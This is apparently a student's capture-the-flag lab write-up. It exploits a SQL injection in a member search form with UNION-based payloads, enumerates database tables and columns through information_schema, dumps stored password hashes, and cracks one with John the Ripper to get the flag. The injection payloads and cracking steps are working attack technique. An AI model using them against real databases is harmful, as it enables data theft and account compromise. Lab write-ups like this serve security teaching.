Vulnerability name : SQL Injection

How to defend : Sanitize user input

We can assume the search member function interacts with the database in some way.

So, the first thing to try is having an input that would lead to an SQL error like a single quote.

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'' at line 1
```

This confirms that we are directly querying the database, which means it might be vulnerable to SQL injections.

After trying a few things, we realize that we can use UNION to query other things.

```
5 UNION SELECT COUNT(_), NULL FROM users --
5 UNION SELECT COUNT(_), first_name FROM users --
```

this lists all table names

```
6 UNION SELECT NULL, table_name FROM information_schema.tables--
```

this lists all column names

```
6 UNION SELECT NULL, column_name FROM information_schema.columns--
```

this lists all columns of the table users, we're using hex because strings are being escaped

```
6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273--
```

Listing all columns gave us this :

```
ID: 5 UNION SELECT NULL, column_name FROM information_schema.columns--
First name:
Surname : FLAG
```

But after finding the table that this columbs belong to

```

ID: 5 UNION SELECT NULL, table_name FROM information_schema.columns WHERE column_name=0x464C4147--
First name:
Surname : INNODB_SYS_TABLES

```

and trying to get FLAG from it

```

5 UNION SELECT NULL, FLAG FROM INNODB_SYS_TABLES--

```

we get

```

Table 'Member_Sql_Injection.INNODB_SYS_TABLES' doesn't exist

```

seemingly it's a metadata table and flag is actually in the documentation as being "The flag field returns the dict_table_t::flags that correspond to the data dictionary record."

so wrong way

however we queried all columns from users

```
ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273--
First name:
Surname : town

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273--
First name:
Surname : country

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273--
First name:
Surname : planet

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273--
First name:
Surname : Commentaire

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273--
First name:
Surname : countersign
```

and after querying Commentaire & countersign we get

```
ID: 6 UNION SELECT Commentaire, countersign FROM users--
First name: Je pense, donc je suis
Surname : 2b3366bcfd44f540e630d4dc2b9b06d9

ID: 6 UNION SELECT Commentaire, countersign FROM users--
First name: Aamu on iltaa viisaampi.
Surname : 60e9032c586fb422e2c16dee6286cf10

ID: 6 UNION SELECT Commentaire, countersign FROM users--
First name: Dublin is a city of stories and secrets.
Surname : e083b24a01c483437bcf4a9eea7c1b4d

ID: 6 UNION SELECT Commentaire, countersign FROM users--
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

its MD5 again according to dcode

and after using john the ripper :

```
darklyProject git:(master) ✗ ../john/run/john --format=Raw-MD5 countersign
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=20
Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Warning: Only 22 candidates buffered for the current salt, minimum 24 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
0g 0:00:00:00 DONE 1/3 (2024-11-21 16:49) 0g/s 145600p/s 145600c/s 145600C/s Getflag1905..Getflag1900
Proceeding with wordlist:../john/run/password.lst
Enabling duplicate candidate password suppressor
Disabling duplicate candidate password suppressor
FortyTwo         (GetFlag)
1g 0:00:00:30 DONE 2/3 (2024-11-21 16:49) 0.03243g/s 14193Kp/s 14193Kc/s 14193KC/s NorwaY1..KushaL
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

now we we lower case to : fortytwo, encode it to sha256 as asked and tada : 10A16D834F9B1E4068B25C4C46FE0284E99E44DCEAF08098FC83925BA6310FF5
